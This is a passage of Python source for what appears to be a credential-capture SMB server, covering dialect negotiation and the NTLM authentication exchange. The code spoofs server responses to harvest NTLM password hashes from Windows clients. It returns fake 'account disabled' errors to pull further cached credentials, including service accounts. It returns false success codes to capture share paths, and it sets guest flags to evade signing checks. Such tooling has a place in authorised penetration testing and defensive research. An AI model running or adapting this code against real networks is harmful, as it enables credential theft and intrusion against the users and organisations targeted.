            offset = 0
            for _ in range(context_data["NegotiateContextCount"]):
                context = smb3.SMB2NegotiateContext(raw_context_list[offset:])
                match context["ContextType"]:
                    case smb3.SMB2_ENCRYPTION_CAPABILITIES:
                        req_enc_caps = smb3.SMB2EncryptionCapabilities(context["Data"])
                        target_cipher = uint16.from_bytes(
                            req_enc_caps["Ciphers"],
                            order=LittleEndian,
                        )
                    case 0x0008:  # SMB2_SIGNING_CAPABILITIES_ID
                        req_sign_caps = SMB2SigningCapabilities.from_bytes(
                            context["Data"]
                        )
                        target_sign = req_sign_caps.SigningAlgorithms[0]

                offset += context["DataLength"] + 8
                offset += (8 - (offset % 8)) % 8
        except Exception as e:
            self.logger.debug(f"Warning: invalid negotiate context list: {e}")
        return target_cipher, target_sign

    def _build_smb2_negotiate_response(
        self,
        target_revision: int,
        request: smb2.SMB2Negotiate | None = None,
    ) -> smb2.SMB2Negotiate_Response:
        """Build an SMB2 NEGOTIATE response -- [MS-SMB2] §2.2.4.

        Constructs a complete NEGOTIATE response with server capabilities,
        realistic max sizes for direct TCP, a SPNEGO security token, and
        (for SMB 3.1.1) negotiate contexts for preauth integrity, encryption,
        and signing algorithms.

        :param target_revision: The selected SMB2 dialect hex constant
        :type target_revision: int
        :param request: The client's parsed NEGOTIATE request, used to extract
            3.1.1 negotiate contexts, defaults to None
        :type request: smb2.SMB2Negotiate | None, optional
        :return: The populated SMB2 NEGOTIATE response structure
        :rtype: smb2.SMB2Negotiate_Response
        """
        command = smb2.SMB2Negotiate_Response()
        # [MS-SMB2] §2.2.4 / §3.3.5.4: SMB2_NEGOTIATE_SIGNING_ENABLED MUST be set
        command["SecurityMode"] = 0x01
        # [MS-SMB2] §3.3.5.4: set to the common dialect
        command["DialectRevision"] = target_revision
        # Stable ServerGuid per server instance — [MS-SMB2] §2.2.4
        command["ServerGuid"] = self.server.server_guid  # type: ignore[union-attr]
        # Realistic capabilities — [MS-SMB2] §2.2.4
        command["Capabilities"] = SMB2_SERVER_CAPABILITIES
        # Per-dialect max sizes matching real Windows pcap behaviour:
        # 2.0.2 → 64K, 2.1+ → 8M (direct TCP, port 445)
        max_size = (
            SMB2_MAX_SIZE_SMALL
            if target_revision == smb2.SMB2_DIALECT_002
            else SMB2_MAX_SIZE_LARGE
        )
        command["MaxTransactSize"] = max_size
        command["MaxReadSize"] = max_size
        command["MaxWriteSize"] = max_size
        # [MS-SMB2] §2.2.4: SystemTime set to current time in FILETIME format
        command["SystemTime"] = get_server_time()
        # [MS-SMB2] §3.3.5.4: ServerStartTime SHOULD be zero <286>
        command["ServerStartTime"] = 0
        # [MS-SMB2] §2.2.4: offset from SMB2 header to Buffer (64+64=0x80)
        command["SecurityBufferOffset"] = 0x80

        # [MS-SMB2] §3.3.5.4 / [MS-SPNG] §3.2.5.2: SPNEGO negTokenInit2
        blob = build_neg_token_init([SPNEGO_NTLMSSP_MECH])
        command["Buffer"] = blob.getData()
        command["SecurityBufferLength"] = len(command["Buffer"])

        if target_revision == smb2.SMB2_DIALECT_311:
            # [MS-SMB2] §2.2.3.1.1 SMB2_PREAUTH_INTEGRITY_CAPABILITIES
            int_caps = smb3.SMB2PreAuthIntegrityCapabilities()
            int_caps["HashAlgorithmCount"] = 1
            int_caps["SaltLength"] = 32
            int_caps["HashAlgorithms"] = SMB2_INTEGRITY_SHA512
            int_caps["Salt"] = secrets.token_bytes(32)

            # [MS-SMB2] §2.2.3.1.2 SMB2_ENCRYPTION_CAPABILITIES
            target_cipher = smb3.SMB2_ENCRYPTION_AES128_GCM
            target_sign = 0x001  # [MS-SMB2] §2.2.3.1.7: AES-CMAC signing algorithm
            if request:
                target_cipher, target_sign = self._smb3_get_target_capabilities(request)

            enc_caps = smb3.SMB2EncryptionCapabilities()
            enc_caps["CipherCount"] = 1
            enc_caps["Ciphers"] = uint16.to_bytes(target_cipher, order=LittleEndian)

            # [MS-SMB2] §2.2.3.1.7 SMB2_SIGNING_CAPABILITIES
            sign_caps = SMB2SigningCapabilities(
                SigningAlgorithmCount=1, SigningAlgorithms=[target_sign]
            )

            context_data = self._smb3_build_neg_context_list(
                [
                    (
                        smb3.SMB2_PREAUTH_INTEGRITY_CAPABILITIES,
                        int_caps.getData(),
                    ),
                    (
                        smb3.SMB2_ENCRYPTION_CAPABILITIES,
                        enc_caps.getData(),
                    ),
                    (SMB2_SIGNING_CAPABILITIES_ID, sign_caps.to_bytes()),
                ]
            )

            offset: int = 0x80 + command["SecurityBufferLength"]
            sec_buf_pad = self._smb3_neg_context_pad(
                0x80 + command["SecurityBufferLength"]
            )
            command["NegotiateContextOffset"] = offset + len(sec_buf_pad)
            command["NegotiateContextList"] = sec_buf_pad + context_data
            command["NegotiateContextCount"] = 3

        return command

    def handle_smb2_negotiate(self, packet: smb2.SMB2Packet) -> None:
        """Handle an SMB2 NEGOTIATE request from the client.

        The client sends a list of SMB2 dialect versions it supports.
        The server selects the greatest common dialect within its
        configured min/max range and responds with server capabilities,
        a SPNEGO security token, and (for SMB 3.1.1) negotiate contexts
        for preauth integrity, encryption, and signing algorithms.

        If no common dialect exists, responds with STATUS_NOT_SUPPORTED.

        Spec: [MS-SMB2] §3.3.5.4

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        :raises BaseProtoHandler.TerminateConnection: If the client sends no
            dialects or no common dialect is available
        """
        req = smb3.SMB2Negotiate(data=packet["Data"])
        dialect_count: int = req["DialectCount"]
        req_raw_dialects: list[int] = req["Dialects"]
        dialect_count = min(dialect_count, len(req_raw_dialects))

        req_dialects: list[int] = req_raw_dialects[:dialect_count]
        if len(req_dialects) == 0:
            # [MS-SMB2] §3.3.5.4: DialectCount == 0 → STATUS_INVALID_PARAMETER
            self.logger.debug("SMB2_NEGOTIATE: no dialects offered", is_client=True)
            self.logger.fail("SMB Negotiation: Client failed to provide any dialects.")
            raise BaseProtoHandler.TerminateConnection

        str_req_dialects = ", ".join([SMB2_DIALECTS.get(d, hex(d)) for d in req_dialects])

        # Build ONE consolidated debug line — [MS-SMB2] §2.2.3
        try:
            guid = uuid.UUID(bytes_le=req["ClientGuid"])
            sec_mode: int = req["SecurityMode"]
            client_caps: int = req["Capabilities"]
            debug_parts = (
                f"SMB2_NEGOTIATE: Dialects={str_req_dialects} "
                f"ClientGuid={guid} "
                f"SecurityMode=0x{sec_mode:04x} "
                f"Capabilities=0x{client_caps:08x}"
            )

            # Add NegotiateContexts only for 3.1.1 — [MS-SMB2] §2.2.3.1
            ctx_data: bytes = req["NegotiateContextList"] or b""
            if ctx_data:
                ctx_types = {
                    smb2.SMB2_PREAUTH_INTEGRITY_CAPABILITIES: "PREAUTH_INTEGRITY",
                    smb2.SMB2_ENCRYPTION_CAPABILITIES: "ENCRYPTION",
                    smb2.SMB2_COMPRESSION_CAPABILITIES: "COMPRESSION",
                }
                names: list[str] = []
                offset = 0
                while offset < len(ctx_data) - 4:
                    ctx = smb2.SMB2NegotiateContext(data=ctx_data[offset:])
                    ct: int = ctx["ContextType"]
                    dl: int = ctx["DataLength"]
                    names.append(ctx_types.get(ct, f"0x{ct:04x}"))
                    offset += 8 + dl
                    offset += (8 - (offset % 8)) % 8
                if names:
                    debug_parts += f" NegotiateContexts={', '.join(names)}"

            self.logger.debug(f"{debug_parts}", is_client=True)
        except Exception:
            self.logger.debug(
                f"SMB2_NEGOTIATE: Dialects={str_req_dialects}",
                is_client=True,
            )

        # Select the highest common dialect within the configured range.
        # No adaptive downgrade — negotiate at the client's native dialect.
        #
        # At 3.1.1, hash capture works but the client disconnects after
        # SESSION_SETUP without sending TREE_CONNECT because the spec
        # requires signed responses (which need a session key derived from
        # the user's password hash, which a capture server doesn't have).
        # Share path and filename capture is not possible at 3.1.1.
        cfg = self.smb_config
        valid_dialects = sorted(
            (
                d
                for d in req_dialects
                if d in SMB2_NEGOTIABLE_DIALECTS
                and cfg.smb2_min_dialect <= d <= cfg.smb2_max_dialect
            ),
            reverse=True,
        )
        dialect: int | None = valid_dialects[0] if valid_dialects else None
        if dialect is None:
            self.logger.fail(f"Client requested unsupported dialects: {str_req_dialects}")
            # [MS-SMB2] §3.3.5.4: respond with STATUS_NOT_SUPPORTED.
            # [MS-SMB2] §2.2.2: error responses use SMB2 ERROR structure.
            resp = smb2.SMB2Error()
            self.send_smb2_command(
                resp.getData(),
                status=nt_errors.STATUS_NOT_SUPPORTED,
                command=smb2.SMB2_NEGOTIATE,
            )
            raise BaseProtoHandler.TerminateConnection

        command = self._build_smb2_negotiate_response(dialect, req)
        self.smb2_selected_dialect = dialect
        # [MS-SMB2] §2.2.3: SecurityMode bit 0x0002 = SIGNING_REQUIRED
        try:
            self.smb2_client_signing_required = bool(req["SecurityMode"] & 0x0002)
        except Exception:
            self.smb2_client_signing_required = False
        # Client's highest offered dialect (uncapped by our MaxDialect)
        client_negotiable = [d for d in req_dialects if d in SMB2_NEGOTIABLE_DIALECTS]
        self.smb2_client_max_dialect = max(client_negotiable) if client_negotiable else 0
        dialect_name = SMB2_DIALECTS.get(dialect, hex(dialect))
        self.client_info["smb_dialect"] = dialect_name
        self.logger.debug(
            f"SMB2_NEGOTIATE: selected dialect {dialect_name}", is_server=True
        )

        if dialect == smb2.SMB2_DIALECT_311:
            # [MS-SMB2] §3.2.5.3.1: at 3.1.1 the client requires signed
            # SESSION_SETUP responses.  Signing needs a session key derived
            # from the user's password hash, which a capture server does
            # not have.  Hash capture still works (the AUTHENTICATE_MESSAGE
            # arrives before the signed response is validated), but the
            # client will disconnect after auth — no TREE_CONNECT, CREATE,
            # or READ follows, so share path and filename capture is not
            # possible.
            self.logger.debug(
                "SMB 3.1.1: hash capture OK, but path/filename capture "
                "unavailable (client requires signed responses)",
                is_server=True,
            )

        self.send_smb2_command(command.getData())

    # -- SMB1 Negotiate --

    def handle_smb1_negotiate(self, packet: smb.NewSMBPacket) -> None:
        """Handle SMB1 NEGOTIATE -- [MS-SMB] §3.3.5.2.

        Parses the dialect list, checks for SMB2 upgrade, and builds
        the appropriate extended or non-extended security response.
        Supports three negotiate paths: SMB1-to-SMB2 protocol transition
        (when AllowSMB1Upgrade is enabled and SMB2 dialect strings are
        present), SMB1 extended security (NTLMSSP/SPNEGO), and SMB1
        non-extended security (raw challenge/response or plaintext).

        :param packet: Parsed SMB1 packet from the client
        :type packet: smb.NewSMBPacket
        :raises BaseProtoHandler.TerminateConnection: If the client sends no
            dialects or does not offer NT LM 0.12 (and SMB2 upgrade is
            not available)
        """
        resp = smb.NewSMBPacket()
        resp["Flags1"] = smb.SMB.FLAGS1_REPLY
        resp["Pid"] = packet["Pid"]
        resp["Tid"] = packet["Tid"]
        resp["Mid"] = packet["Mid"]

        req = smb.SMBCommand(packet["Data"][0])
        # [MS-CIFS] §2.2.4.52.1: each dialect prefixed by 0x02
        req_data_dialects: list[bytes] = req["Data"].split(b"\x02")[1:]
        if len(req_data_dialects) == 0:
            self.logger.debug("SMB_COM_NEGOTIATE: no dialects offered", is_client=True)
            self.logger.fail("SMB Negotiation: Client failed to provide any dialects.")
            raise BaseProtoHandler.TerminateConnection

        dialects: list[str] = [
            dialect.rstrip(b"\x00").decode(errors="replace")
            for dialect in req_data_dialects
        ]
        self.logger.debug(
            f"SMB_COM_NEGOTIATE: Dialects={', '.join(dialects)}",
            is_client=True,
        )

        cfg = self.smb_config

        # Check for SMB2 dialect strings for protocol transition
        # [MS-SMB2] §3.3.5.3.1 — only when AllowSMB1Upgrade and EnableSMB2
        smb2_upgrade_target: str | None = None
        if cfg.smb_allow_smb1_upgrade and cfg.smb_enable_smb2:
            smb2_entries: dict[str, int] = {
                dialect: index
                for index, dialect in enumerate(dialects)
                if dialect in SMB2_DIALECT_REV
            }
            if smb2_entries:
                # Prefer "SMB 2.???" wildcard per [MS-SMB2] §3.3.5.3.1
                if "SMB 2.???" in smb2_entries:
                    smb2_upgrade_target = "SMB 2.???"
                else:
                    # Select greatest dialect by numeric value
                    smb2_upgrade_target = max(
                        smb2_entries,
                        key=lambda d: SMB2_DIALECT_REV.get(d, 0),
                    )

        if smb2_upgrade_target is not None:
            command = self._build_smb2_negotiate_response(
                SMB2_DIALECT_REV[smb2_upgrade_target]
            )
            self.logger.debug("SMB_COM_NEGOTIATE: switching to SMBv2", is_server=True)
            upgrade_dialect = SMB2_DIALECT_REV[smb2_upgrade_target]
            self.client_info["smb_dialect"] = (
                f"{SMB2_DIALECTS.get(upgrade_dialect, hex(upgrade_dialect))} (from SMB1)"
            )
            self.send_smb2_command(command.getData(), command=smb2.SMB2_NEGOTIATE)
            return

        # Find NT LM 0.12 dialect — [MS-SMB] extensions only apply to it
        nt_lm_index: int | None = None
        for i, d in enumerate(dialects):
            if d == "NT LM 0.12":
                nt_lm_index = i
                break

        if nt_lm_index is None:
            self.logger.fail(
                "Client did not offer NT LM 0.12 dialect (and SMB2 upgrade not available)"
            )
            raise BaseProtoHandler.TerminateConnection

        # Shared negotiate parameters — [MS-CIFS] §2.2.4.52.2
        server_time = get_server_time()

        # Respond based on the client's capabilities: if the client sets
        # FLAGS2_EXTENDED_SECURITY, respond with SPNEGO/NTLMSSP.  If not,
        # respond with a raw 8-byte challenge so legacy and non-standard
        # clients (embedded devices, nmap, old Windows) can still
        # authenticate.  This deviates from modern Windows (which always
        # sends extended security) but ensures we capture hashes from
        # EVERY client type, not just modern ones.
        use_extended = bool(packet["Flags2"] & smb.SMB.FLAGS2_EXTENDED_SECURITY)

        if use_extended:
            # --- Extended security path (NTLMSSP/SPNEGO) ---
            self.smb1_extended_security = True

            # [MS-SMB] §2.2.3.1: response Flags2 for extended security negotiate
            resp["Flags2"] = (
                smb.SMB.FLAGS2_EXTENDED_SECURITY
                | smb.SMB.FLAGS2_NT_STATUS
                | smb.SMB.FLAGS2_UNICODE
                | smb.SMB.FLAGS2_LONG_NAMES
            )

            _dialects_data = smb.SMBExtended_Security_Data()
            # Stable ServerGuid per server instance — [MS-SMB2] §2.2.4
            _dialects_data["ServerGUID"] = self.server.server_guid  # type: ignore[union-attr]
            blob = build_neg_token_init([SPNEGO_NTLMSSP_MECH])
            _dialects_data["SecurityBlob"] = blob.getData()

            _dialects_parameters = smb.SMBExtended_Security_Parameters()
            # Realistic capabilities matching Windows 7+ pcap (0x8001e3fc)
            _dialects_parameters["Capabilities"] = (
                smb.SMB.CAP_EXTENDED_SECURITY | SMB1_CAPABILITIES_BASE
            )
            _dialects_parameters["ChallengeLength"] = 0
        else:
            # --- Non-extended security path (raw challenge/response) ---
            # [MS-SMB] §2.2.4.5.2.2
            self.smb1_extended_security = False
            self.smb1_challenge = self.config.ntlm_challenge

            # [MS-SMB] §2.2.3.1: response Flags2 for non-extended security
            # NO FLAGS2_EXTENDED_SECURITY; include UNICODE + LONG_NAMES
            resp["Flags2"] = (
                smb.SMB.FLAGS2_NT_STATUS
                | smb.SMB.FLAGS2_UNICODE
                | smb.SMB.FLAGS2_LONG_NAMES
            )

            _dialects_parameters = smb.SMBNTLMDialect_Parameters()
            _dialects_data = smb.SMBNTLMDialect_Data()

            # SecurityMode — [MS-CIFS] §2.2.4.52.2
            _dialects_parameters["SecurityMode"] = (
                smb.SMB.SECURITY_AUTH_ENCRYPTED | smb.SMB.SECURITY_SHARE_USER
            )
            _dialects_parameters["ChallengeLength"] = 8
            _dialects_data["Challenge"] = self.config.ntlm_challenge

            # Realistic capabilities matching Windows pcap — NO CAP_EXTENDED_SECURITY
            _dialects_parameters["Capabilities"] = SMB1_CAPABILITIES_BASE

            # DomainName and ServerName — [MS-CIFS] §2.2.4.52.2
            # Payload is the raw concatenation of DomainName + ServerName;
            # the virtual DomainName/ServerName fields are parse-time only.
            _dialects_data["Payload"] = smbserver.encodeSMBString(
                resp["Flags2"], cfg.smb_nb_domain
            ) + smbserver.encodeSMBString(resp["Flags2"], cfg.smb_nb_computer)

            _dialects_parameters["DialectIndex"] = nt_lm_index
            _dialects_parameters["MaxMpxCount"] = SMB1_MAX_MPX_COUNT
            _dialects_parameters["MaxNumberVcs"] = 1
            _dialects_parameters["MaxBufferSize"] = SMB1_MAX_BUFFER_SIZE
            _dialects_parameters["MaxRawSize"] = 65536
            _dialects_parameters["SessionKey"] = 0
            # [MS-CIFS] §2.2.4.52.2: SystemTime as FILETIME split into 32-bit words
            _dialects_parameters["LowDateTime"] = server_time & 0xFFFFFFFF
            _dialects_parameters["HighDateTime"] = (server_time >> 32) & 0xFFFFFFFF
            _dialects_parameters["ServerTimeZone"] = 0

            command = smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)
            command["Data"] = _dialects_data
            command["Parameters"] = _dialects_parameters

            self.logger.debug(
                "SMB_COM_NEGOTIATE: selected dialect NT LM 0.12 (non-extended)",
                is_server=True,
            )
            self.client_info["smb_dialect"] = "NT LM 0.12 (non-extended)"
            resp.addCommand(command)
            self.send_data(resp.getData())
            return

        # Extended security common path
        _dialects_parameters["DialectIndex"] = nt_lm_index
        _dialects_parameters["SecurityMode"] = (
            smb.SMB.SECURITY_AUTH_ENCRYPTED | smb.SMB.SECURITY_SHARE_USER
        )
        _dialects_parameters["MaxMpxCount"] = SMB1_MAX_MPX_COUNT
        _dialects_parameters["MaxNumberVcs"] = 1
        _dialects_parameters["MaxBufferSize"] = SMB1_MAX_BUFFER_SIZE
        _dialects_parameters["MaxRawSize"] = 65536
        _dialects_parameters["SessionKey"] = 0
        # SystemTime must be current FILETIME — [MS-CIFS] §2.2.4.52.2
        _dialects_parameters["LowDateTime"] = server_time & 0xFFFFFFFF
        _dialects_parameters["HighDateTime"] = (server_time >> 32) & 0xFFFFFFFF
        _dialects_parameters["ServerTimeZone"] = 0

        command = smb.SMBCommand(smb.SMB.SMB_COM_NEGOTIATE)
        command["Data"] = _dialects_data
        command["Parameters"] = _dialects_parameters

        self.logger.debug(
            "SMB_COM_NEGOTIATE: selected dialect NT LM 0.12", is_server=True
        )
        self.client_info["smb_dialect"] = "NT LM 0.12"
        resp.addCommand(command)
        self.send_data(resp.getData())

    # ══ Phase 2: Authentication ═══════════════════════════════════════════════════

    # -- NTLMSSP (shared SMB1/SMB2) --

    def handle_ntlmssp(
        self,
        token: bytes,
        command_name: str = "SMB2_SESSION_SETUP",
    ) -> tuple[bytes, int]:
        """Handle the NTLMSSP 3-message authentication exchange.

        NTLM authentication over SMB uses a 3-message handshake:
          1. Client sends NEGOTIATE_MESSAGE (flags, version hints)
          2. Server replies with CHALLENGE_MESSAGE (8-byte nonce, AV_PAIRs)
          3. Client sends AUTHENTICATE_MESSAGE (hashed credentials)

        The token may be wrapped in SPNEGO/GSSAPI (tags 0x60/0xA1) or
        sent as raw NTLMSSP. This method unwraps SPNEGO if present, then
        dispatches based on the NTLM message type byte at offset 8.

        On the first call, allocates both SMB1 Uid and SMB2 SessionID
        for this connection. After capturing credentials from the
        AUTHENTICATE_MESSAGE, returns either STATUS_ACCOUNT_DISABLED
        (to trigger a retry with different credentials) or the final
        configured error code.

        :param token: Raw security token from the SMB session setup request
        :type token: bytes
        :param command_name: SMB command name for log attribution, defaults to
            "SMB2_SESSION_SETUP"
        :type command_name: str, optional
        :raises BaseProtoHandler.TerminateConnection: If the GSSAPI token is
            malformed, the NTLM token length is invalid, an unsupported
            NTLM message type is received, or a CHALLENGE_MESSAGE arrives
            unexpectedly
        :return: Tuple of (response_token_bytes, ntstatus_error_code)
        :rtype: tuple[bytes, int]
        """
        is_gssapi = not token.startswith(b"NTLMSSP")

        # Allocate session IDs on first session setup
        if self.smb2_session_id == 0:
            # [MS-SMB2] §3.3.5.5.1: MUST NOT be 0 or -1
            self.smb2_session_id = secrets.randbelow(0xFFFFFFFFFFFFFFFE) + 1
        if self.smb1_uid == 0:
            # [MS-SMB] §3.3.5.3: unique UID, 1..0xFFFF
            self.smb1_uid = secrets.randbelow(0xFFFE) + 1

        match token[0]:
            case 0x60:  # [RFC4178] §4.2.1 / [MS-SPNG]: ASN.1 APPLICATION[0]
                self.logger.debug(f"<{command_name}> GSSAPI negTokenInit", is_client=True)
                try:
                    neg_token = spnego.SPNEGO_NegTokenInit(data=token)
                except Exception as e:
                    self.logger.debug(f"Invalid GSSAPI token: {e}")
                    raise BaseProtoHandler.TerminateConnection from None

                mech_type = neg_token["MechTypes"][0]
                if mech_type != smbserver.TypesMech[SPNEGO_NTLMSSP_MECH]:
                    name = smbserver.MechTypes.get(mech_type, "<unknown>")
                    self.logger.fail(
                        f"<{command_name}> Unsupported mechanism: "
                        f"{name} ({mech_type.hex()})"
                    )
                    resp = build_neg_token_resp(
                        NEG_STATE_REJECT,
                        supported_mech=SPNEGO_NTLMSSP_MECH,
                    )
                    return (
                        resp.getData(),
                        nt_errors.STATUS_MORE_PROCESSING_REQUIRED,
                    )
                token = neg_token["MechToken"]

            case 0xA1:  # [RFC4178] §4.2.2 / [MS-SPNG]: ASN.1 CONTEXT[1]
                self.logger.debug(f"<{command_name}> GSSAPI negTokenArg", is_client=True)
                try:
                    neg_token = spnego.SPNEGO_NegTokenResp(data=token)
                except Exception as e:
                    self.logger.debug(f"Invalid GSSAPI token: {e}")
                    raise BaseProtoHandler.TerminateConnection from None
                token = neg_token["ResponseToken"]

        if len(token) <= 8:
            self.logger.fail(f"<{command_name}> Invalid NTLM token length: {len(token)}")
            raise BaseProtoHandler.TerminateConnection

        cfg = self.smb_config
        error_code = cfg.smb_error_code

        match token[8]:
            case 0x01:  # [MS-NLMP] §2.2.1.1: NEGOTIATE_MESSAGE
                negotiate = ntlm.NTLMAuthNegotiate()
                negotiate.fromString(token)
                if not is_gssapi:
                    self.logger.debug(
                        f"<{command_name}> NTLMSSP_NEGOTIATE_MESSAGE", is_client=True
                    )

                # NTLM-layer NEGOTIATE parsing and logging stays in ntlm.py.
                # Store the returned dict to pass through to NTLM_handle_authenticate_message
                # for the deduped display line.  Do NOT merge into client_info
                # — the SMB display line uses only SMB-layer fields.
                self.ntlm_negotiate_fields = NTLM_handle_negotiate_message(
                    negotiate, self.logger
                )

                challenge = NTLM_build_challenge_message(
                    negotiate,
                    challenge=self.config.ntlm_challenge,
                    nb_computer=self.config.ntlm_nb_computer,
                    nb_domain=self.config.ntlm_nb_domain,
                    disable_ess=self.config.ntlm_disable_ess,
                    disable_ntlmv2=self.config.ntlm_disable_ntlmv2,
                    target_type=self.config.ntlm_target_type,
                    version=self.config.ntlm_version,
                    dns_computer=self.config.ntlm_dns_computer,
                    dns_domain=self.config.ntlm_dns_domain,
                    dns_tree=self.config.ntlm_dns_tree,
                    log=self.logger,
                )
                self.logger.debug(
                    f"<{command_name}> NTLMSSP_CHALLENGE_MESSAGE", is_server=True
                )
                if is_gssapi:
                    resp = build_neg_token_resp(
                        NEG_STATE_ACCEPT_INCOMPLETE,
                        challenge.getData(),
                        supported_mech=SPNEGO_NTLMSSP_MECH,
                    )
                else:
                    resp = challenge

                # [MS-SMB2] §3.3.5.5.3: auth still in progress
                error_code = nt_errors.STATUS_MORE_PROCESSING_REQUIRED

            case 0x02:  # [MS-NLMP] §2.2.1.2: CHALLENGE_MESSAGE — unexpected
                if not is_gssapi:
                    self.logger.debug(
                        f"<{command_name}> NTLMSSP_CHALLENGE_MESSAGE", is_client=True
                    )
                self.logger.debug("NTLM challenge message not supported!")
                raise BaseProtoHandler.TerminateConnection

            case 0x03:  # [MS-NLMP] §2.2.1.3: AUTHENTICATE_MESSAGE
                authenticate = ntlm.NTLMAuthChallengeResponse()
                authenticate.fromString(token)
                if not is_gssapi:
                    self.logger.debug(
                        f"<{command_name}> NTLMSSP_AUTHENTICATE_MESSAGE", is_client=True
                    )

                # NTLM-layer AUTHENTICATE parsing and logging in ntlm.py.
                # Returns True if real credentials were captured, False
                # for anonymous or parse failures.
                captured = NTLM_handle_authenticate_message(
                    authenticate,
                    challenge=self.config.ntlm_challenge,
                    client=self.client_address,
                    session=self.config,
                    logger=self.logger,
                    negotiate_fields=self.ntlm_negotiate_fields,
                )

                if not captured:
                    # Anonymous probe or parse failure — reject so the
                    # client retries with real credentials (XP sends
                    # anonymous first, then the real auth).
                    error_code = nt_errors.STATUS_ACCESS_DENIED
                    resp = build_neg_token_resp(NEG_STATE_REJECT)
                else:
                    # Real credentials captured — resolve error code.
                    # Returns STATUS_ACCOUNT_DISABLED for multi-cred
                    # intermediate attempts, STATUS_SUCCESS for final
                    # (to let client proceed to TREE_CONNECT for path).
                    error_code = self._resolve_auth_error_code()
                    if error_code == nt_errors.STATUS_SUCCESS:
                        resp = build_neg_token_resp(NEG_STATE_ACCEPT_COMPLETED)
                    else:
                        resp = build_neg_token_resp(NEG_STATE_REJECT)

            case message_type:
                self.logger.debug(f"<{command_name}> NTLMSSP: unknown {message_type:02x}")
                raise BaseProtoHandler.TerminateConnection

        return resp.getData(), error_code

    def _resolve_auth_error_code(self) -> int:
        """Determine the NTSTATUS error code for the current auth attempt.

        Windows SSPI retries authentication with alternate cached
        credentials when it receives STATUS_ACCOUNT_DISABLED (0xC0000072).
        This allows capturing multiple credential hashes per connection
        (e.g., the interactive user's hash AND a service account hash).

        When ``CapturesPerConnection`` is 0 (the default), multi-credential
        retry is disabled.  The final auth response always returns
        ``STATUS_SUCCESS`` so the client proceeds to TREE_CONNECT, where
        the share path is captured before the configured error code is
        returned.  When > 0, the first N-1 captures return
        STATUS_ACCOUNT_DISABLED to trigger retries, and the Nth capture
        returns STATUS_SUCCESS for the tree connect path capture.

        :return: NTSTATUS code -- STATUS_ACCOUNT_DISABLED for intermediate
            attempts, or STATUS_SUCCESS for the final attempt (to allow
            tree connect path capture)
        :rtype: int
        """
        self.auth_attempt_count += 1
        max_captures = self.smb_config.smb_captures_per_connection

        if max_captures > 0 and self.auth_attempt_count < max_captures:
            self.logger.debug(
                "ErrorCode=0x%08x (STATUS_ACCOUNT_DISABLED, capture %d/%d)",
                STATUS_ACCOUNT_DISABLED,
                self.auth_attempt_count,
                max_captures,
                is_server=True,
            )
            return STATUS_ACCOUNT_DISABLED

        # Return SUCCESS to let the client proceed to TREE_CONNECT,
        # where we capture the share path before returning the real
        # error code.  See handle_smb2_tree_connect / handle_smb1_tree_connect.
        self.logger.debug(
            "ErrorCode=0x%08x (STATUS_SUCCESS, awaiting tree connect)",
            0,
            is_server=True,
        )
        return nt_errors.STATUS_SUCCESS

    # -- SMB2 Session --

    def handle_smb2_session_setup(self, packet: smb2.SMB2Packet) -> None:
        """Handle an SMB2 SESSION_SETUP request.

        Carries the NTLMSSP authentication exchange wrapped in SPNEGO.
        Extracts the security token from the request, passes it to
        :meth:`handle_ntlmssp` for processing, and returns the response token
        with the appropriate NTSTATUS code (STATUS_MORE_PROCESSING_REQUIRED
        while the exchange is in progress, or the final error/success code).

        Spec: [MS-SMB2] §3.3.5.5

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
        req = smb2.SMB2SessionSetup(data=packet["Data"])

        # Log PreviousSessionId — [MS-SMB2] §2.2.5
        try:
            prev_session: int = req["PreviousSessionId"]
            prev_str = f"0x{prev_session:016x}" if prev_session else "(empty)"
            self.logger.debug(
                f"SMB2_SESSION_SETUP: PreviousSessionId={prev_str}",
                is_client=True,
            )
        except Exception:
            self.logger.debug("Failed to extract PreviousSessionId", exc_info=True)

        command = smb2.SMB2SessionSetup_Response()

        resp_token, error_code = self.handle_ntlmssp(
            req["Buffer"], command_name="SMB2_SESSION_SETUP"
        )
        command["SecurityBufferLength"] = len(resp_token)
        # [MS-SMB2] §2.2.6: offset from header start (64 hdr + 8 fixed = 0x48)
        command["SecurityBufferOffset"] = 0x48
        command["Buffer"] = resp_token

        # [MS-SMB2] §2.2.6 / §3.2.5.3.1: IS_GUEST (0x0001) sets
        # Session.SigningRequired=FALSE on the client, so unsigned
        # responses (including VALIDATE_NEGOTIATE_INFO) are accepted.
        #
        # Three-tier decision using SIGNING_REQUIRED + client max dialect:
        #
        #   1. SIGNING_REQUIRED set → never IS_GUEST
        #      §3.2.5.3.1: IS_GUEST + SigningRequired = client MUST fail.
        #      Future-proofing for Win11 24H2+ / Server 2025.
        #
        #   2. Client max dialect ≤ 3.0.2 → IS_GUEST
        #      These clients (Win8.1, Srv2012R2, Srv2016) have
        #      AllowInsecureGuestAccess=TRUE → IS_GUEST accepted → ✓
        #
        #   3. Client max dialect ≥ 3.1.1 → no IS_GUEST
        #      These clients (Win10, Win11, Srv2019, Srv2022) have
        #      AllowInsecureGuestAccess=FALSE → IS_GUEST rejected → H.
        #      Without IS_GUEST at 2.x they get P (path from
        #      TREE_CONNECT before VALIDATE_NEGOTIATE RST).
        if error_code == nt_errors.STATUS_SUCCESS:
            if self.smb2_client_signing_required:
                self.logger.debug(
                    "SMB %s: no IS_GUEST (client requires signing)",
                    SMB2_DIALECTS.get(self.smb2_selected_dialect, "SMB2"),
                    is_server=True,
                )
            elif self.smb2_client_max_dialect <= smb2.SMB2_DIALECT_302:
                command["SessionFlags"] = 0x0001  # SMB2_SESSION_FLAG_IS_GUEST
                self.logger.debug(
                    "SMB %s: IS_GUEST set (client max ≤3.0.2, signing not required)",
                    SMB2_DIALECTS.get(self.smb2_selected_dialect, "SMB2"),
                    is_server=True,
                )
            else:
                self.logger.debug(
                    "SMB %s: no IS_GUEST (client max ≥3.1.1, "
                    "AllowInsecureGuestAccess likely FALSE)",
                    SMB2_DIALECTS.get(self.smb2_selected_dialect, "SMB2"),
                    is_server=True,
                )

        self.send_smb2_command(
            command.getData(),
            packet,
            status=error_code,
        )

    def handle_smb2_logoff(self, packet: smb2.SMB2Packet) -> None:
        """Handle SMB2 LOGOFF -- [MS-SMB2] §3.3.5.6.

        Logs the client logoff, resets the authenticated flag, and sends
        a successful LOGOFF response.

        :param packet: Parsed SMB2 packet from the client
        :type packet: smb2.SMB2Packet
        """
